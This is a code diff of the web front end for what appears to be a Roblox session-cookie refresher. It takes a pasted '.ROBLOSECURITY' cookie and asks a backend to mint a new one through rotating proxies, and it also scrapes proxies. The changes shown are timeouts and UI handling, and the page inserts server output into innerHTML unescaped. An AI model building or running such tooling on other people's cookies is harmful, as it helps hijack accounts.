@@ -17,8 +17,7 @@
       <section class="card">
         <label for="cookie">Paste your <code>.ROBLOSECURITY</code> cookie</label>
         <textarea id="cookie" rows="4"
-          placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...">
-        </textarea>
+          placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
         <div class="actions">
           <button id="btn-refresh" class="primary">Refresh Cookie</button>
           <button id="btn-validate" class="ghost">Validate Only</button>
@@ -45,15 +44,6 @@
   <script>
     const $ = (id) => document.getElementById(id);
 
-    async function post(url, body) {
-      const r = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body),
-      });
-      return r.json();
-    }
-
     async function loadStats() {
       try {
         const r = await fetch("/api/proxies");
@@ -72,12 +62,29 @@
       btn.disabled = true;
       btn.textContent = "Refreshing...";
 
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 300000);
+
       try {
-        const d = await post("/api/refresh", { cookie });
+        const r = await fetch("/api/refresh", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cookie }),
+          signal: controller.signal,
+        });
+        const d = await r.json();
         showResult(d);
       } catch (e) {
-        showResult({ ok: false, error: "Request failed: " + e.message });
+        if (e.name === "AbortError") {
+          showResult({
+            ok: false,
+            error: "Client timed out after 5 minutes. Check Railway logs — backend may still be working.",
+          });
+        } else {
+          showResult({ ok: false, error: "Request failed: " + e.message });
+        }
       } finally {
+        clearTimeout(timeoutId);
         btn.disabled = false;
         btn.textContent = "Refresh Cookie";
       }
@@ -86,17 +93,36 @@
     $("btn-validate").onclick = async () => {
       const cookie = $("cookie").value.trim();
       if (!cookie) return alert("Paste a cookie first.");
-      const d = await post("/api/validate", { cookie });
-      showResult({
-        ok: d.ok,
-        valid: d.valid,
-        message: d.valid ? "Cookie is valid." : "Cookie is invalid or expired.",
-      });
+      const btn = $("btn-validate");
+      btn.disabled = true;
+      btn.textContent = "Validating...";
+      try {
+        const r = await fetch("/api/validate", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cookie }),
+        });
+        const d = await r.json();
+        showResult({
+          ok: d.ok,
+          valid: d.valid,
+          message: d.valid ? "Cookie is valid." : (d.error || "Cookie is invalid or expired."),
+        });
+      } catch (e) {
+        showResult({ ok: false, error: "Request failed: " + e.message });
+      } finally {
+        btn.disabled = false;
+        btn.textContent = "Validate Only";
+      }
     };
 
     $("btn-scrape").onclick = async () => {
-      await post("/api/scrape", {});
-      alert("Scrape started. Check back in ~30s.");
+      await fetch("/api/scrape", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: "{}",
+      });
+      alert("Scrape started. Check back in ~60s, then reload.");
     };
 
     function showResult(d) {
@@ -106,15 +132,18 @@
 
       if (d.ok && d.cookie) {
         body.innerHTML = `
-          <p class="ok">New cookie generated via <b>${d.method || "proxy"}</b>
-          ${d.proxy ? `(${d.proxy})` : ""} in ${d.attempts || "?"} attempt(s).</p>
-          <textarea rows="4" readonly>${d.cookie}</textarea>
-          <button class="ghost" onclick="navigator.clipboard.writeText(this.previousElementSibling.value)">Copy</button>
+          <p class="ok">New cookie via <b>${d.method || "proxy"}</b>
+          ${d.proxy ? `(${d.proxy})` : ""} · ${d.attempts || "?"} attempt(s).</p>
+          <textarea rows="4" readonly id="newcookie">${d.cookie}</textarea>
+          <button class="ghost" onclick="navigator.clipboard.writeText(document.getElementById('newcookie').value)">Copy</button>
         `;
       } else {
+        const attemptsHtml = d.attempts
+          ? `<pre>${JSON.stringify(d.attempts, null, 2)}</pre>`
+          : "";
         body.innerHTML = `
           <p class="err">${d.error || d.message || "Unknown error."}</p>
-          ${d.attempts ? `<pre>${JSON.stringify(d.attempts, null, 2)}</pre>` : ""}
+          ${attemptsHtml}
         `;
       }
     }
